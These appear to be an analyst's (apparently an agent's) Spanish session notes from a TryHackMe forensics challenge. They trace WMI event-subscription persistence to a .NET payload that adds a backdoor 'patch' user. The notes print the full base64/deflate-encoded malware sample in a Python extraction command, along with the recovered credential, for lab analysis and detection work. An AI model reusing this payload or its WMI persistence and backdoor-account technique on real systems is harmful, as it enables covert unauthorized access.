# Session Notes — After Hours (THM)

## Timeline

| Timestamp | Acción | Hallazgo |
|-----------|--------|----------|
| 2025-08-29 05:40 | Inicio sesión, lectura agent.md, verificación estructura | — |
| 2025-08-29 05:45 | Exploración `content/` → ZIP con 5 archivos WMI repo | `INDEX.BTR`, `MAPPING*.MAP`, `OBJECTS.DATA` |
| 2025-08-29 05:50 | Intento parsing ESE con `dissect.esedb` → **FAIL** (invalid header signature) | Formato no estándar / JET Blue variant |
| 2025-08-29 05:55 | Fallback: `strings` en `OBJECTS.DATA` | WMI subscriptions: `SCM Event Log Filter/Consumer`, PowerShell base64 |
| 2025-08-29 06:00 | Decodificación PowerShell → leer `ConfigData` de `Win32_HardwareTelemetry` | Payload .NET comprimido (deflate) + base64 |
| 2025-08-29 06:05 | Extracción payload → `payload.exe` (4096 bytes, .NET 4.0) | Assembly `AfterHours`, clase `Program.Main` |
| 2025-08-29 06:10 | Análisis strings UTF-16LE en PE → comando `net user patch <b64> /add` | Contraseña: `THM{P4tch_op3ned_th3_BacKd00r}` |
| 2025-08-29 06:15 | Generación `report.md` (PTES) | Completo |

## Hipótesis probadas

1. **H1: Persistencia en Run keys / Scheduled Tasks / Services** → **DESCARTADA** (briefing lo confirma, verificación manual en strings del repo no muestra artefactos)
2. **H2: WMI Event Subscription** → **CONFIRMADA** (strings `__EventFilter`, `__EventConsumer`, `__FilterToConsumerBinding` + `CommandLineTemplate`)
3. **H3: Payload almacenado en WMI class property** → **CONFIRMADA** (`Win32_HardwareTelemetry.ConfigData`)
4. **H4: Payload es .NET y crea usuario backdoor** → **CONFIRMADA** (strings `AfterHours`, `Environment.MachineName`, `net user patch`)

## Comandos clave ejecutados

```bash
# Extracción ZIP
unzip -o content/attachments-*.zip -d content/extracted/

# Strings hunting
strings content/extracted/OBJECTS.DATA | grep -i -E "(EventFilter|EventConsumer|FilterToConsumer|CommandLineTemplate)"

# Decodificación PowerShell (manual, desde strings)
# $file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value
# ... deflate + Assembly.Load

# Extracción payload con Python
python3 -c "
import base64, zlib
b64='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'
c=base64.b64decode(b64)
d=zlib.decompress(c, -zlib.MAX_WBITS)
open('content/extracted/payload.exe','wb').write(d)
"

# Extracción credencial
python3 -c "
import base64
print(base64.b64decode('VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9').decode())
"
```

## Evidencia recolectada

- `content/extracted/OBJECTS.DATA` — Repositorio WMI (fuente primaria)
- `content/extracted/payload.exe` — PE .NET extraído (4096 bytes)
- `loot/creds_plaintext.txt` — Credencial: `patch:THM{P4tch_op3ned_th3_BacKd00r}`

## Próximos pasos (si hubiera continuidad)

1. Verificar persistencia en host real (si hay acceso): `Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding`
2. Cazar lateral movement: buscar misma suscripción en otros hosts del dominio
3. Analizar `INDEX.BTR` / `MAPPING*.MAP` para recuperar objetos borrados (posible anti-forensics)
4. Generar regla Sigma personalizada para detección continua

## Decisiones de ponytail (lazy mode)

- No se intentó reparar parsing ESE → `strings` fue suficiente y más rápido
- No se usó decompilador IL (ILSpy/dnSpy) → strings UTF-16LE en PE revelaron todo el comando
- No se hizo análisis dinámico (ejecutar payload) → estático fue concluyente y más seguro
- Reporte generado directo sin plantilla intermedia → formato PTES del agent.md